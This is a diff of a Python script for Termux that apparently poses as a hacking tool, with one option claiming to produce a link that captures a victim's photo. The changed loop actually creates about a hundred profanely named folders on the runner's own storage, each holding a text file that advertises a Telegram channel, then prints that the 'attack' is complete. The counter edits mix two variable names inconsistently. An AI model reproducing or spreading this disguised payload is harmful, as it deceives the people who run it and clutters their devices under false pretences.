@@ -49,20 +49,20 @@ if task == '5':
 	print('Ссылка сгенерирована!')
 	print('Ссылка: http://gg.gg/mn7og')
 	print('После перехода по ссылке, фото жертвы появится в папке photos')
-counter1 = 1
-while (counter1<=100):
+counter = 1
+while (counter<=100):
 	try:
 		os.makedirs('/sdcard/тебя_наебали' + '_' + str(counter) + '_раз')
 		time.sleep(0.1)
 		f = open('/sdcard/тебя_наебали' + '_' + str(counter) + '_раз/открой.txt', 'w')
 		f.write('не хочешь больше попадаться на такую хуйню? подпишись на нас в тг: @toxic_termux')
 		f.close()
-		counter1 = int(counter1) + 1
+		counter1 = int(counter) + 1
 	except:
 		os.makedirs('/data/data/com.termux/files/home/тебя_наебали' + '_' + str(counter) + '_раз')
 		time.sleep(1)
 		f = open('/data/data/com.termux/files/home/тебя_наебали' + '_' + str(counter) + '_раз/открой.txt', 'w')
 		f.write('не хочешь больше попадаться на такую хуйню? подпишись на нас в тг: @toxic_termux')
 		f.close()
-		counter1 = int(counter1) + 1
+		counter = int(counter) + 1
 print('Атака завершена. Отчёт об атаке сохранен в памяти устройства')
